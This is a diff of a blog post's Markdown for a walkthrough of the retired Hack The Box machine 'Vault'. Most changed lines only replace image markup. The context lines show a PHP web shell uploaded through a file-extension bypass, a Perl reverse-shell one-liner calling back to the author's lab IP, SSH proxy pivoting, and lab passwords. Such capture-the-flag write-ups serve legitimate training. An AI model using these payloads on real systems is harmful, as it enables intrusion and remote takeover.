@@ -17,10 +17,10 @@ This post documents the complete walkthrough of Vault, a retired vulnerable [VM]
 
 <!--more-->
 
-## On this post 
-{:.no_toc} 
+## On this post
+{:.no_toc}
 
-* TOC 
+* TOC
 {:toc}
 
 ## Background
@@ -49,9 +49,9 @@ PORT   STATE SERVICE REASON         VERSION
 
 `nmap` finds `22/tcp` and `80/tcp` open. Nothing extraordinary. This is how the site looks like.
 
-<a class="image-popup">
-![6b88c991.png](/assets/images/posts/vault-htb-walkthrough/6b88c991.png)
-</a>
+
+{% include image.html image_alt="6b88c991.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/6b88c991.png" %}
+
 
 ### Directory/File Enumeration
 
@@ -128,15 +128,15 @@ Requests/sec.: 230.0764
 ```
 Awesome. `wfuzz` finds another page. This is how it looks like.
 
-<a class="image-popup">
-![f098ee0c.png](/assets/images/posts/vault-htb-walkthrough/f098ee0c.png)
-</a>
+
+{% include image.html image_alt="f098ee0c.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/f098ee0c.png" %}
+
 
 The new page exposes a new attack surface at `/changelogo.php` as well.
 
-<a class="image-popup">
-![33bd9acb.png](/assets/images/posts/vault-htb-walkthrough/33bd9acb.png)
-</a>
+
+{% include image.html image_alt="33bd9acb.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/33bd9acb.png" %}
+
 
 
 ### File Upload Bypass
@@ -171,9 +171,9 @@ curl -s \
 
 The script takes in a file extension as argument. I'm using GNU Parallel to speed things up like so.
 
-<a class="image-popup">
-![33494eeb.png](/assets/images/posts/vault-htb-walkthrough/33494eeb.png)
-</a>
+
+{% include image.html image_alt="33494eeb.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/33494eeb.png" %}
+
 
 You can see that these are the whitelisted file extensions and only `.php5` is executable. The file `info` contains the following PHP code:
 
@@ -181,9 +181,9 @@ You can see that these are the whitelisted file extensions and only `.php5` is e
 <?php phpinfo(); ?>
 ```
 
-<a class="image-popup">
-![9ec9d39a.png](/assets/images/posts/vault-htb-walkthrough/9ec9d39a.png)
-</a>
+
+{% include image.html image_alt="9ec9d39a.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/9ec9d39a.png" %}
+
 
 With that in mind, we can craft another file with the following PHP code and save it as `cmd.php5`. After uploading, the file will allow us to execute remote commands.
 
@@ -191,9 +191,9 @@ With that in mind, we can craft another file with the following PHP code and sav
 <?php echo shell_exec($_GET[0]); ?>
 ```
 
-<a class="image-popup">
-![fb19a5ac.png](/assets/images/posts/vault-htb-walkthrough/fb19a5ac.png)
-</a>
+
+{% include image.html image_alt="fb19a5ac.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/fb19a5ac.png" %}
+
 
 Perfect.
 
@@ -207,29 +207,29 @@ perl -e 'use Socket;$i="10.10.14.109";$p=1234;socket(S,PF_INET,SOCK_STREAM,getpr
 
 It's best to urlencode the code to prevent complications because we are entering it on the browser's address bar.
 
-<a class="image-popup">
-![7af10ac4.png](/assets/images/posts/vault-htb-walkthrough/7af10ac4.png)
-</a>
+
+{% include image.html image_alt="7af10ac4.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/7af10ac4.png" %}
+
 
 Awesome. We have shell. Let's go through the usual process to [upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) the shell to full TTY.
 
 During enumeration of `www-data`'s account, I found the password (`Dav3therav3123`) to `dave`'s SSH account and other pertinent information at `/home/dave/Desktop`.
 
-<a class="image-popup">
-![1f6b2197.png](/assets/images/posts/vault-htb-walkthrough/1f6b2197.png)
-</a>
+
+{% include image.html image_alt="1f6b2197.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/1f6b2197.png" %}
+
 
 Voila. Another shell this time as `dave`.
 
-<a class="image-popup">
-![83c88ad8.png](/assets/images/posts/vault-htb-walkthrough/83c88ad8.png)
-</a>
+
+{% include image.html image_alt="83c88ad8.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/83c88ad8.png" %}
+
 
 Notice that the host has many virtual network interfaces. One of them is a virtual bridge that links to `192.168.122.0/24`.
 
-<a class="image-popup">
-![6cb58904.png](/assets/images/posts/vault-htb-walkthrough/6cb58904.png)
-</a>
+
+{% include image.html image_alt="6cb58904.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/6cb58904.png" %}
+
 
 ### DNS + Configurator
 
@@ -247,9 +247,9 @@ Let's do a dynamic port-forwarding with SSH. It opens up a SOCKS proxy on my att
 ssh -D9999 dave@10.10.10.109 -f -N 2>/dev/null
 ```
 
-<a class="image-popup">
-![4a118c43.png](/assets/images/posts/vault-htb-walkthrough/4a118c43.png)
-</a>
+
+{% include image.html image_alt="4a118c43.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/4a118c43.png" %}
+
 
 The proxy on the browser is set up to point to `socks5://127.0.0.1:9999`.
 
@@ -281,19 +281,19 @@ Requests/sec.: 71.45762
 
 Notice I'm pointing `wfuzz` to the SOCKS proxy set up earlier. What do we have here? `notes` looks interesting.
 
-<a class="image-popup">
-![3c6dd785.png](/assets/images/posts/vault-htb-walkthrough/3c6dd785.png)
-</a>
+
+{% include image.html image_alt="3c6dd785.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/3c6dd785.png" %}
+
 
 It seems to be suggesting the presence of two files: `123.ovpn` and `script.sh`.
 
-<a class="image-popup">
-![ac8af4ee.png](/assets/images/posts/vault-htb-walkthrough/ac8af4ee.png)
-</a>
 
-<a class="image-popup">
-![ecb360c0.png](/assets/images/posts/vault-htb-walkthrough/ecb360c0.png)
-</a>
+{% include image.html image_alt="ac8af4ee.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/ac8af4ee.png" %}
+
+
+
+{% include image.html image_alt="ecb360c0.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/ecb360c0.png" %}
+
 
 Here's what I think is happening here. Editing the text area in `/vpnconfig.php` and hitting **Update file** writes to `123.ovpn` and hitting the link **Test VPN** executes `script.sh`.
 
@@ -301,83 +301,83 @@ I know that OpenVPN client configuration file can execute shell commands but I n
 
 Back in `dave`'s shell, I run the following command to find a valid OpenVPN server.
 
-<a class="image-popup">
-![fd3274f1.png](/assets/images/posts/vault-htb-walkthrough/fd3274f1.png)
-</a>
+
+{% include image.html image_alt="fd3274f1.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/fd3274f1.png" %}
+
 
 Ha ha. It's almost as if the creator anticipates mistakes to be made, that's why he catered for so many servers. Now, let's see if these OpenVPN commands will work.
 
-<a class="image-popup">
-![c5f74644.png](/assets/images/posts/vault-htb-walkthrough/c5f74644.png)
-</a>
+
+{% include image.html image_alt="c5f74644.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/c5f74644.png" %}
+
 
 Meanwhile, I have a `nc` listener set at `192.168.122.1` on `2323/tcp`
 
-<a class="image-popup">
-![1453c035.png](/assets/images/posts/vault-htb-walkthrough/1453c035.png)
-</a>
+
+{% include image.html image_alt="1453c035.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/1453c035.png" %}
+
 
 A `root` shell to DNS!
 
 During enumeration, I discovered `dave`'s SSH password (`dav3gerous567`) to DNS and he is able to `sudo` as `root`. That saves us from spawning a shell through OpenVPN every time and SSH provides a far more superior shell.
 
-<a class="image-popup">
-![3160fc55.png](/assets/images/posts/vault-htb-walkthrough/3160fc55.png)
-</a>
+
+{% include image.html image_alt="3160fc55.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/3160fc55.png" %}
+
 
 The file `user.txt` is at `dave`'s home directory.
 
-<a class="image-popup">
-![f5917e6f.png](/assets/images/posts/vault-htb-walkthrough/f5917e6f.png)
-</a>
+
+{% include image.html image_alt="f5917e6f.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/f5917e6f.png" %}
+
 
 I also discovered DNS has access to `192.168.5.0/24` through the firewall at `192.168.122.5`. Check out the routing table.
 
-<a class="image-popup">
-![2cf3c871.png](/assets/images/posts/vault-htb-walkthrough/2cf3c871.png)
-</a>
+
+{% include image.html image_alt="2cf3c871.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/2cf3c871.png" %}
+
 
 I'm betting the Vault is one of the hosts in the `192.168.5.0/24` subnet but which one? I went through the logs searching for hints the creator might have left and here's what I found.
 
-<a class="image-popup">
-![a4d59e66.png](/assets/images/posts/vault-htb-walkthrough/a4d59e66.png)
-</a>
+
+{% include image.html image_alt="a4d59e66.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/a4d59e66.png" %}
+
 
 It's clear the firewall only accepts inbound traffic with a source port of `4444/tcp` to the host `192.168.5.2` listening at `987/tcp`.
 
 Let's see what's behind `987/tcp` with `ncat` and the `-p` option to indicate our source port.
 
-<a class="image-popup">
-![99e445ae.png](/assets/images/posts/vault-htb-walkthrough/99e445ae.png)
-</a>
+
+{% include image.html image_alt="99e445ae.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/99e445ae.png" %}
+
 
 I see. `987/tcp` is a wrapper for SSH.
 
 SSH comes with a slew of options, particularly the ProxyCommand option allows `ssh` to proxy traffic through a network utility tool like `ncat`.
 
-<a class="image-popup">
-![1802494e.png](/assets/images/posts/vault-htb-walkthrough/1802494e.png)
-</a>
+
+{% include image.html image_alt="1802494e.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/1802494e.png" %}
+
 
 This is awesome, isn't it?
 
 I noticed a pattern of `dave`'s having SSH accounts on all the hosts encountered thus far, so that's what I'm going to try.
 
-<a class="image-popup">
-![689779f1.png](/assets/images/posts/vault-htb-walkthrough/689779f1.png)
-</a>
+
+{% include image.html image_alt="689779f1.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/689779f1.png" %}
+
 
 Sweet. The password is `dav3gerous567`. However, `dave`'s default shell is a restricted one. Fret not, we just have to re-login like so.
 
-<a class="image-popup">
-![f11979a4.png](/assets/images/posts/vault-htb-walkthrough/f11979a4.png)
-</a>
+
+{% include image.html image_alt="f11979a4.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/f11979a4.png" %}
+
 
 The file `root.txt` is here but appears encrypted with GPG.
 
-<a class="image-popup">
-![6396cd2c.png](/assets/images/posts/vault-htb-walkthrough/6396cd2c.png)
-</a>
+
+{% include image.html image_alt="6396cd2c.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/6396cd2c.png" %}
+
 
 It doesn't appear the file is encrypted on this host because the directory `.gnupg` is not here. There's a couple more hints to suggest the decryption is to be done elsewhere.
 
@@ -387,21 +387,21 @@ It doesn't appear the file is encrypted on this host because the directory `.gnu
 
 We can print a `base64`-encoded string of the file `root.txt.gpg` like so.
 
-<a class="image-popup">
-![b05dd087.png](/assets/images/posts/vault-htb-walkthrough/b05dd087.png)
-</a>
+
+{% include image.html image_alt="b05dd087.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/b05dd087.png" %}
+
 
 Copy the string to the first `dave` shell and decrypt it like so.
 
-<a class="image-popup">
-![84e46fc9.png](/assets/images/posts/vault-htb-walkthrough/84e46fc9.png)
-</a>
+
+{% include image.html image_alt="84e46fc9.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/84e46fc9.png" %}
+
 
 The passphrase is indeed `itscominghome`. And you get `root.txt` after the decryption.
 
-<a class="image-popup">
-![f5311724.png](/assets/images/posts/vault-htb-walkthrough/f5311724.png)
-</a>
+
+{% include image.html image_alt="f5311724.png" image_src="/6398fd14-7eb4-4724-b98d-fb6ab6907574/f5311724.png" %}
+
 
 :dancer:
 
